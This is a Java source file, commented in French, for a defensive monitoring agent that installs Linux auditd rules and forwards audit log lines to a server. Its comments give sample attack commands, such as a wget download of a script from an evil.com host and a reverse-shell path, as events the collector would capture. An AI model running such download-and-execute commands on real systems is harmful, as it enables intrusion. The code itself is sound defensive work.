package com.warroom.agent.collectors.audit;

import com.warroom.agent.collectors.base.AbstractCollector;
import com.warroom.agent.collectors.log.LogTailer;
import com.warroom.agent.kernel.config.AgentConfig;
import com.warroom.agent.transmission.LocalEventQueue;
import com.warroom.agent.transmission.model.RawEvent;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

/**
 * Collecteur d'audit système — visibilité TEMPS RÉEL sur les appels système.
 *
 * ══════════════════════════════════════════════════════════════════════
 *  POURQUOI CE COLLECTEUR EST LE PLUS PUISSANT
 * ══════════════════════════════════════════════════════════════════════
 *
 * Les autres collecteurs ont des angles morts :
 *
 *   - LogCollector      : ne voit que ce que les services CHOISISSENT de loguer.
 *                          Si un programme ne log rien, il est invisible.
 *
 *   - ProcessCollector   : prend des SNAPSHOTS toutes les 60 secondes.
 *                          Un malware qui se lance et se termine en 5 secondes
 *                          entre deux snapshots passe complètement inaperçu.
 *
 *   - NetworkCollector   : même problème de snapshot. Une connexion C2 rapide
 *                          (exfiltration de données en 2 secondes) peut échapper.
 *
 *   - FileIntegrity      : vérifie les HASHES toutes les 2 minutes.
 *                          Ne détecte pas QUI a modifié le fichier, ni QUAND exactement.
 *
 * AuditCollector résout TOUS ces problèmes. Le framework "audit" du noyau Linux
 * intercepte les appels système (syscalls) EN TEMPS RÉEL, au moment même où
 * ils se produisent. Rien ne peut échapper à l'audit kernel :
 *
 *   - Un processus se lance pendant 2 secondes ? L'appel execve() est capturé.
 *   - Quelqu'un ouvre /etc/shadow ? L'appel open() est capturé.
 *   - Un module kernel est chargé ? L'appel init_module() est capturé.
 *   - Un processus se connecte à une IP externe ? L'appel connect() est capturé.
 *
 * ══════════════════════════════════════════════════════════════════════
 *  QU'EST-CE QU'UN APPEL SYSTÈME (SYSCALL) ?
 * ══════════════════════════════════════════════════════════════════════
 *
 * Un programme ne peut RIEN faire sur un ordinateur sans passer par le noyau.
 *
 * Quand un programme veut lire un fichier, créer un processus, ouvrir une
 * connexion réseau, ou faire quoi que ce soit qui touche aux ressources du
 * système, il doit DEMANDER au noyau de le faire pour lui. Cette demande
 * s'appelle un "appel système" (system call / syscall).
 *
 * C'est comme un guichet unique : tout programme, qu'il soit légitime ou
 * malveillant, DOIT passer par ce guichet. Le framework audit installe
 * une "caméra" sur ce guichet qui enregistre chaque demande.
 *
 * Les syscalls les plus importants pour la sécurité :
 *
 *   execve       → Lancer un programme. CHAQUE programme lancé sur la machine
 *                   passe par cet appel. C'est la "caméra à l'entrée" :
 *                   on voit TOUT ce qui démarre, même les processus éphémères
 *                   que ps aux ne verrait jamais.
 *                   Exemples capturés :
 *                     wget http://evil.com/malware.sh
 *                     /tmp/.hidden/reverse_shell
 *                     python3 -c "import socket; ..."
 *
 *   open/openat  → Ouvrir un fichier. Permet de voir qui LIT ou ÉCRIT
 *                   dans les fichiers sensibles. FileIntegrity détecte que
 *                   /etc/shadow a changé, mais audit dit QUI l'a modifié,
 *                   avec quel programme, et à quelle seconde exacte.
 *
 *   connect      → Se connecter à une adresse réseau. Capture CHAQUE
 *                   connexion sortante, même celles qui durent 1 seconde.
 *                   NetworkCollector ne verrait pas une connexion aussi rapide.
 *
 *   init_module  → Charger un module dans le noyau. C'est comme ça qu'un
 *   finit_module   rootkit kernel s'installe. Si quelqu'un charge un module
 *                   .ko sur un serveur de production, c'est presque toujours
 *                   suspect.
 *
 *   ptrace       → Injecter du code dans un autre processus. Utilisé par
 *                   les debuggers (gdb) mais aussi par les malwares pour
 *                   s'injecter dans un processus légitime (ex: se cacher
 *                   dans sshd pour voler les mots de passe).
 *
 * ══════════════════════════════════════════════════════════════════════
 *  QU'EST-CE QUE AUDITD ?
 * ══════════════════════════════════════════════════════════════════════
 *
 * "auditd" (audit daemon) est le service Linux qui :
 *   1. Configure les RÈGLES d'audit dans le noyau (quels syscalls surveiller)
 *   2. Reçoit les événements du noyau
 *   3. Les écrit dans un fichier de log : /var/log/audit/audit.log
 *
 * Sans auditd, le noyau ne surveille rien (par défaut, l'audit est désactivé).
 * Notre collecteur a donc besoin que auditd soit installé et actif.
 *
 * ── INSTALLATION (si pas déjà installé) :
 *   sudo apt install auditd        (Debian/Ubuntu)
 *   sudo yum install audit          (CentOS/Red Hat)
 *
 * ── VÉRIFICATION :
 *   sudo systemctl status auditd    (doit être "active (running)")
 *   sudo auditctl -l                (liste les règles actives)
 *
 * ══════════════════════════════════════════════════════════════════════
 *  QU'EST-CE QU'UNE RÈGLE D'AUDIT ?
 * ══════════════════════════════════════════════════════════════════════
 *
 * Une règle d'audit dit au noyau : "surveille cet événement et écris-le
 * dans le log". Sans règles, auditd tourne mais ne capture rien d'utile.
 *
 * Il y a deux types de règles :
 *
 * 1. RÈGLES DE SYSCALL (surveiller un appel système) :
 *    -a always,exit -F arch=b64 -S execve -k exec_cmd
 *    │               │           │          │
 *    │               │           │          └─ "tag" : un mot-clé pour filtrer
 *    │               │           └─ quel syscall surveiller
 *    │               └─ architecture 64 bits
 *    └─ "always,exit" = loguer à la SORTIE du syscall (quand on a le résultat)
 *
 * 2. RÈGLES DE FICHIER (surveiller les accès à un fichier) :
 *    -w /etc/shadow -p wa -k shadow_access
 *    │               │      │
 *    │               │      └─ tag
 *    │               └─ w=écriture, a=attributs (permissions)
 *    └─ chemin du fichier à surveiller
 *
 * ══════════════════════════════════════════════════════════════════════
 *  FORMAT DU LOG AUDIT
 * ══════════════════════════════════════════════════════════════════════
 *
 * Le fichier /var/log/audit/audit.log contient des lignes comme :
 *
 *   type=SYSCALL msg=audit(1642012345.123:456): arch=c000003e syscall=59
 *     success=yes exit=0 ppid=1234 pid=5678 uid=0 gid=0
 *     comm="wget" exe="/usr/bin/wget"
 *
 *   type=EXECVE msg=audit(1642012345.123:456): argc=3
 *     a0="wget" a1="http://evil.com/malware.sh" a2="-O" a3="/tmp/mal.sh"
 *
 * Ce format est dense mais extrêmement riche :
 *   - syscall=59 → c'est execve (numéro 59 sur x86_64)
 *   - uid=0 → exécuté par root
 *   - comm="wget" → le nom court du programme
 *   - exe="/usr/bin/wget" → le chemin complet du binaire
 *   - a0, a1, a2... → les arguments exacts de la commande
 *
 * Le serveur (Personne B) parsera ces lignes dans son AuditAnalyzer
 * pour détecter les commandes suspectes.
 *
 * ══════════════════════════════════════════════════════════════════════
 *  COMMENT CE COLLECTEUR FONCTIONNE
 * ══════════════════════════════════════════════════════════════════════
 *
 *   Phase 1 — Vérification : auditd est-il installé et actif ?
 *             Si non, on log un avertissement mais on ne crashe pas.
 *             Le collecteur passera en mode "attente" et vérifiera
 *             périodiquement si auditd est démarré.
 *
 *   Phase 2 — Installation des règles : on utilise "auditctl" pour
 *             ajouter nos règles de surveillance. Si l'agent n'a pas
 *             les droits root, cette étape échoue silencieusement
 *             (les règles existantes sont quand même utilisées).
 *
 *   Phase 3 — Tail du log : on réutilise LogTailer (le même mécanisme
 *             que LogCollector) pour lire les nouvelles lignes de
 *             /var/log/audit/audit.log en continu.
 *
 *   Phase 4 — Envoi : chaque nouvelle ligne est envoyée comme RawEvent
 *             avec sourceType = "linux.audit".
 */
public class AuditCollector extends AbstractCollector {

    // ═══════════════════════════════════════════════════════════
    //  CONSTANTES
    // ═══════════════════════════════════════════════════════════

    private static final String NAME = "AuditCollector";

    /**
     * Le sourceType envoyé avec chaque événement audit.
     * Le serveur utilisera ce champ pour router vers l'AuditAnalyzer.
     */
    private static final String SOURCE_TYPE = "linux.audit";

    /**
     * Intervalle de polling du fichier audit.log (en millisecondes).
     *
     * Plus court que LogCollector (500ms vs 1000ms) car les événements
     * d'audit sont critiques et on veut une latence minimale.
     * Le fichier audit.log est aussi généralement plus actif que auth.log.
     */
    private static final long POLL_INTERVAL_MS = 500;

    /**
     * Intervalle de vérification si auditd n'est pas disponible.
     * On vérifie toutes les 30 secondes si auditd a été démarré.
     */
    private static final long RETRY_INTERVAL_MS = 30_000;

    /**
     * Chemin du fichier de log audit.
     *
     * C'est le chemin par défaut sur toutes les distributions Linux.
     * Configurable dans /etc/audit/auditd.conf via le paramètre "log_file".
     * Sur 99% des installations, c'est ce chemin.
     */
    private static final Path AUDIT_LOG_PATH = Path.of("/var/log/audit/audit.log");

    /**
     * Les règles d'audit que notre agent va tenter d'installer.
     *
     * Chaque règle est un tableau d'arguments pour la commande "auditctl".
     *
     * CHOIX DES RÈGLES — pourquoi celles-ci et pas d'autres :
     *
     * On sélectionne uniquement les règles à haute valeur sécuritaire
     * qui ne génèrent pas trop de bruit. Un serveur Linux fait des
     * milliers de syscalls par seconde — si on loguait TOUT, le
     * fichier audit.log exploserait en quelques minutes.
     *
     * Les règles choisies ciblent les actions qui sont :
     *   1. Rares en fonctionnement normal (faible volume)
     *   2. Quasi-toujours présentes lors d'une attaque (haute détection)
     *   3. Difficiles à détecter autrement (complètent les autres collecteurs)
     */
    private static final List<AuditRule> RULES = List.of(

            // ── EXÉCUTION DE PROGRAMMES ─────────────────────────
            // Capture CHAQUE programme lancé sur la machine.
            // C'est la règle la plus importante : un malware, un
            // reverse shell, un outil de hacking — tout passe par execve.
            //
            // Pourquoi c'est mieux que ProcessCollector :
            // ps aux prend un snapshot toutes les 60 secondes.
            // Un malware qui se lance, fait son travail en 3 secondes,
            // et se supprime est INVISIBLE pour ps aux.
            // Avec cette règle, execve est capturé instantanément.
            //
            // Le tag "-k exec_cmd" permet au serveur de filtrer
            // rapidement ces événements dans le log.
            new AuditRule(
                    "execve (process execution)",
                    new String[]{
                            "auditctl", "-a", "always,exit",
                            "-F", "arch=b64",
                            "-S", "execve",
                            "-k", "warroom_exec"
                    }
            ),

            // ── CONNEXIONS RÉSEAU SORTANTES ─────────────────────
            // Capture chaque connexion TCP/UDP initiée depuis la machine.
            // Le syscall "connect" est appelé quand un programme
            // se connecte à une adresse distante.
            //
            // Pourquoi c'est mieux que NetworkCollector :
            // ss -tunap prend un snapshot toutes les 30 secondes.
            // Une connexion C2 rapide (envoi de données → fermeture)
            // peut passer entre deux snapshots.
            // Avec cette règle, chaque connect() est loguée.
            //
            // Note : cette règle peut être bruyante sur un serveur
            // qui fait beaucoup de connexions sortantes (ex: serveur
            // web qui appelle des API). Sur un poste de travail
            // ou un serveur interne, c'est parfait.
            new AuditRule(
                    "connect (outgoing network connections)",
                    new String[]{
                            "auditctl", "-a", "always,exit",
                            "-F", "arch=b64",
                            "-S", "connect",
                            "-k", "warroom_net"
                    }
            ),

            // ── CHARGEMENT DE MODULES KERNEL ────────────────────
            // Capture le chargement de modules .ko dans le noyau.
            // C'est ainsi qu'un rootkit kernel s'installe.
            //
            // init_module  = chargement via insmod/modprobe (ancien syscall)
            // finit_module = chargement via finit (nouveau syscall, Linux 3.8+)
            //
            // Sur un serveur de production, les modules sont chargés
            // au boot et c'est tout. Un chargement de module à 3h du
            // matin est presque certainement un rootkit.
            //
            // Volume : très faible (quasi-zéro en production).
            new AuditRule(
                    "init_module/finit_module (kernel module loading)",
                    new String[]{
                            "auditctl", "-a", "always,exit",
                            "-F", "arch=b64",
                            "-S", "init_module", "-S", "finit_module",
                            "-k", "warroom_module"
                    }
            ),

            // ── INJECTION DE PROCESSUS (PTRACE) ─────────────────
            // ptrace permet à un processus de s'attacher à un autre
            // processus pour lire/écrire sa mémoire.
            //
            // Usages légitimes : debuggers (gdb, strace).
            // Usages malveillants : injecter du code dans un processus
            // légitime (ex: s'injecter dans sshd pour voler les mots
            // de passe en clair, ou dans nginx pour exfiltrer des données).
            //
            // Sur un serveur de production, personne ne debug.
            // Tout ptrace est suspect.
            //
            // Volume : quasi-zéro en production.
            new AuditRule(
                    "ptrace (process injection/debugging)",
                    new String[]{
                            "auditctl", "-a", "always,exit",
                            "-F", "arch=b64",
                            "-S", "ptrace",
                            "-k", "warroom_inject"
                    }
            ),

            // ── SURVEILLANCE DE FICHIERS CRITIQUES ──────────────
            // Ces règles surveillent les ACCÈS (lecture ET écriture)
            // aux fichiers sensibles. C'est complémentaire à
            // FileIntegrityCollector :
            //
            //   FileIntegrity : détecte que /etc/shadow A ÉTÉ modifié
            //                   (comparaison de hash toutes les 2 minutes)
            //
            //   AuditCollector : détecte QUI modifie /etc/shadow,
            //                    avec quel programme, à quelle seconde,
            //                    EN TEMPS RÉEL.
            //
            // Les flags -p :
            //   w = write (écriture dans le fichier)
            //   a = attribute (changement de permissions, propriétaire...)
            //   r = read (lecture du fichier — utile pour /etc/shadow
            //       car un attaquant qui le LIT peut cracker les
            //       mots de passe hors-ligne)

            new AuditRule(
                    "watch /etc/passwd",
                    new String[]{"auditctl", "-w", "/etc/passwd", "-p", "war", "-k", "warroom_identity"}
            ),

            new AuditRule(
                    "watch /etc/shadow",
                    new String[]{"auditctl", "-w", "/etc/shadow", "-p", "war", "-k", "warroom_identity"}
            ),

            new AuditRule(
                    "watch /etc/sudoers",
                    new String[]{"auditctl", "-w", "/etc/sudoers", "-p", "wa", "-k", "warroom_privilege"}
            ),

            new AuditRule(
                    "watch /etc/ssh/sshd_config",
                    new String[]{"auditctl", "-w", "/etc/ssh/sshd_config", "-p", "wa", "-k", "warroom_ssh"}
            ),

            // ── SURVEILLANCE DU CRONTAB SYSTÈME ─────────────────
            // Complète FileIntegrityCollector : on détecte non seulement
            // que le fichier a changé, mais QUEL processus l'a modifié.
            new AuditRule(
                    "watch /etc/crontab",
                    new String[]{"auditctl", "-w", "/etc/crontab", "-p", "wa", "-k", "warroom_cron"}
            ),

            new AuditRule(
                    "watch /etc/cron.d",
                    new String[]{"auditctl", "-w", "/etc/cron.d", "-p", "wa", "-k", "warroom_cron"}
            )
    );

    // ═══════════════════════════════════════════════════════════
    //  ATTRIBUTS
    // ═══════════════════════════════════════════════════════════

    /**
     * Le tailer qui lit les nouvelles lignes de audit.log.
     * On réutilise LogTailer car le mécanisme est identique :
     * lire les nouvelles lignes d'un fichier de log qui grossit.
     */
    private LogTailer tailer;

    // ═══════════════════════════════════════════════════════════
    //  CONSTRUCTEUR
    // ═══════════════════════════════════════════════════════════

    public AuditCollector(LocalEventQueue eventQueue) {
        super(eventQueue);
    }

    // ═══════════════════════════════════════════════════════════
    //  IMPLÉMENTATION
    // ═══════════════════════════════════════════════════════════

    @Override
    protected String collectorName() {
        return NAME;
    }

    @Override
    protected void collect(AgentConfig config) {

        // ── Phase 1 : vérifier que auditd est disponible ────────
        // Si auditd n'est pas installé ou pas démarré, on attend.
        // On ne crashe pas : l'admin peut l'installer plus tard,
        // et le collecteur se réveillera automatiquement.
        if (!waitForAuditd()) {
            // isRunning() est passé à false → on a été stoppé pendant l'attente.
            return;
        }

        // ── Phase 2 : installer les règles d'audit ──────────────
        // On tente d'ajouter nos règles via "auditctl".
        // Si l'agent n'a pas les droits root, cette étape échoue
        // silencieusement — les règles déjà en place seront utilisées.
        installAuditRules();

        // ── Phase 3 : initialiser le tailer ─────────────────────
        // On se positionne à la fin du fichier (pas d'historique).
        tailer = new LogTailer(AUDIT_LOG_PATH, SOURCE_TYPE);

        System.out.println("[" + NAME + "] Tailing " + AUDIT_LOG_PATH);

        // ── Phase 4 : boucle de lecture ─────────────────────────
        while (isRunning()) {

            try {
                List<String> newLines = tailer.readNewLines();

                for (String line : newLines) {
                    // Chaque ligne du log audit est envoyée telle quelle.
                    // Le serveur (Personne B) se chargera du parsing
                    // dans son AuditAnalyzer (Option A du contrat : payload brut).
                    eventQueue.offer(new RawEvent(SOURCE_TYPE, line));
                }

            } catch (Exception e) {
                System.err.println("[" + NAME + "] Error reading audit log : " + e.getMessage());
            }

            try {
                Thread.sleep(POLL_INTERVAL_MS);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 1 : VÉRIFICATION DE AUDITD
    // ═══════════════════════════════════════════════════════════

    /**
     * Attend que auditd soit disponible (installé + démarré).
     *
     * Vérifie deux conditions :
     *   1. Le fichier /var/log/audit/audit.log existe
     *      (preuve que auditd a déjà écrit au moins une fois)
     *   2. Le service auditd est actif
     *      (vérifié via "auditctl -s" qui retourne le statut)
     *
     * Si auditd n'est pas disponible, on boucle en attendant.
     * L'admin peut :
     *   - installer auditd : sudo apt install auditd
     *   - le démarrer : sudo systemctl start auditd
     *
     * @return true si auditd est prêt, false si le collecteur a été stoppé
     */
    private boolean waitForAuditd() {

        while (isRunning()) {

            // Vérification 1 : le fichier de log existe-t-il ?
            if (!Files.exists(AUDIT_LOG_PATH)) {
                System.err.println("[" + NAME + "] " + AUDIT_LOG_PATH
                        + " not found. Is auditd installed ? (sudo apt install auditd)");
                System.err.println("[" + NAME + "] Retrying in " + (RETRY_INTERVAL_MS / 1000) + "s...");

                if (!sleepInterruptible(RETRY_INTERVAL_MS)) {
                    return false;
                }
                continue;
            }

            // Vérification 2 : auditd est-il actif ?
            // "auditctl -s" affiche le statut du framework audit.
            // Si la commande échoue, auditd n'est probablement pas installé.
            if (!isAuditdActive()) {
                System.err.println("[" + NAME + "] auditd is not active. "
                        + "Start it with: sudo systemctl start auditd");
                System.err.println("[" + NAME + "] Retrying in " + (RETRY_INTERVAL_MS / 1000) + "s...");

                if (!sleepInterruptible(RETRY_INTERVAL_MS)) {
                    return false;
                }
                continue;
            }

            // Tout est prêt.
            System.out.println("[" + NAME + "] auditd is active. Audit log found at " + AUDIT_LOG_PATH);
            return true;
        }

        return false;
    }

    /**
     * Vérifie si le framework audit du noyau est actif.
     *
     * On exécute "auditctl -s" qui retourne quelque chose comme :
     *   enabled 1
     *   failure 1
     *   pid 12345
     *   ...
     *
     * "enabled 1" signifie que l'audit est activé.
     * "enabled 0" signifie qu'il est désactivé.
     * Si la commande échoue (exit code != 0), auditctl n'est
     * pas installé ou l'utilisateur n'a pas les droits.
     *
     * NOTE : auditctl nécessite les droits root pour certaines
     * opérations, mais "auditctl -s" (status) fonctionne parfois
     * sans root selon la distribution. En cas d'échec, on vérifie
     * simplement si le fichier de log existe et grossit.
     */
    private boolean isAuditdActive() {
        try {
            ProcessBuilder builder = new ProcessBuilder("auditctl", "-s");
            builder.redirectErrorStream(true);
            Process process = builder.start();

            String output;
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                output = reader.lines().collect(Collectors.joining("\n"));
            }

            boolean finished = process.waitFor(5, TimeUnit.SECONDS);
            if (!finished) {
                process.destroyForcibly();
                return false;
            }

            // Vérifier que la sortie contient "enabled 1"
            // (audit activé dans le noyau).
            if (output.contains("enabled 1") || output.contains("enabled=1")) {
                return true;
            }

            // Si la commande a réussi (exit code 0) mais que enabled != 1,
            // auditd est installé mais désactivé.
            if (process.exitValue() == 0) {
                System.err.println("[" + NAME + "] Audit framework is disabled in kernel. "
                        + "Enable with: sudo auditctl -e 1");
                return false;
            }

            return false;

        } catch (Exception e) {
            // auditctl n'est pas installé ou pas dans le PATH.
            // On se rabat sur la simple vérification du fichier de log.
            // Si le fichier existe et est non-vide, auditd fonctionne
            // probablement (il a été démarré par systemd).
            return Files.exists(AUDIT_LOG_PATH) && isFileNonEmpty(AUDIT_LOG_PATH);
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  PHASE 2 : INSTALLATION DES RÈGLES D'AUDIT
    // ═══════════════════════════════════════════════════════════

    /**
     * Tente d'installer les règles d'audit dans le noyau via "auditctl".
     *
     * IMPORTANT : cette opération nécessite les droits root.
     * Si l'agent tourne en tant qu'utilisateur normal, toutes les
     * commandes auditctl échoueront avec "Operation not permitted".
     * Ce n'est PAS une erreur critique : on log un avertissement
     * et on continue. Les règles déjà installées par l'admin
     * (dans /etc/audit/rules.d/) seront toujours actives.
     *
     * IDEMPOTENCE : si on relance l'agent, les mêmes règles sont
     * réajoutées. auditctl ne duplique pas les règles identiques,
     * donc c'est safe. Si la règle existe déjà, auditctl retourne
     * un code d'erreur qu'on ignore.
     *
     * PERSISTANCE DES RÈGLES :
     * Les règles ajoutées avec "auditctl" sont TEMPORAIRES : elles
     * disparaissent au reboot. Pour les rendre permanentes, l'admin
     * doit les écrire dans /etc/audit/rules.d/warroom.rules.
     * Notre agent les réinstalle à chaque démarrage, ce qui couvre
     * aussi le cas du reboot.
     */
    private void installAuditRules() {
        int installed = 0;
        int failed = 0;

        System.out.println("[" + NAME + "] Installing " + RULES.size() + " audit rules...");

        for (AuditRule rule : RULES) {
            try {
                ProcessBuilder builder = new ProcessBuilder(rule.command());
                builder.redirectErrorStream(true);
                Process process = builder.start();

                String output;
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
                    output = reader.lines().collect(Collectors.joining("\n"));
                }

                boolean finished = process.waitFor(5, TimeUnit.SECONDS);
                if (!finished) {
                    process.destroyForcibly();
                }

                if (finished && process.exitValue() == 0) {
                    installed++;
                    System.out.println("[" + NAME + "]   ✓ " + rule.description());
                } else {
                    failed++;
                    // Ne PAS loguer en System.err : c'est attendu si pas root.
                    // On le log en info pour ne pas alarmer inutilement.
                    System.out.println("[" + NAME + "]   ✗ " + rule.description()
                            + " (probably need root)");
                }

            } catch (Exception e) {
                failed++;
                System.out.println("[" + NAME + "]   ✗ " + rule.description()
                        + " (" + e.getMessage() + ")");
            }
        }

        System.out.println("[" + NAME + "] Rules: " + installed + " installed, "
                + failed + " failed (need root?).");

        if (failed > 0 && installed == 0) {
            System.err.println("[" + NAME + "] WARNING: No audit rules could be installed. "
                    + "Run the agent as root, or install rules manually:");
            System.err.println("[" + NAME + "]   sudo cp warroom-audit.rules /etc/audit/rules.d/");
            System.err.println("[" + NAME + "]   sudo systemctl restart auditd");
            System.err.println("[" + NAME + "] The collector will still read existing audit events.");
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  UTILITAIRES
    // ═══════════════════════════════════════════════════════════

    /**
     * Dort pendant la durée spécifiée, interruptible.
     *
     * @return true si le sleep s'est terminé normalement,
     *         false si le thread a été interrompu (= stop() appelé)
     */
    private boolean sleepInterruptible(long millis) {
        try {
            Thread.sleep(millis);
            return true;
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return false;
        }
    }

    /**
     * Vérifie si un fichier existe et n'est pas vide.
     */
    private boolean isFileNonEmpty(Path file) {
        try {
            return Files.exists(file) && Files.size(file) > 0;
        } catch (Exception e) {
            return false;
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  RECORD INTERNE : RÈGLE D'AUDIT
    // ═══════════════════════════════════════════════════════════

    /**
     * Représente une règle d'audit à installer.
     *
     * Un "record" Java est une classe immuable générée automatiquement
     * avec un constructeur, des getters, equals(), hashCode() et toString().
     * C'est un simple conteneur de données.
     *
     * @param description description lisible pour les logs
     *                    (ex: "execve (process execution)")
     * @param command     la commande complète pour auditctl
     *                    (ex: {"auditctl", "-a", "always,exit", ...})
     */
    private record AuditRule(String description, String[] command) {
    }
}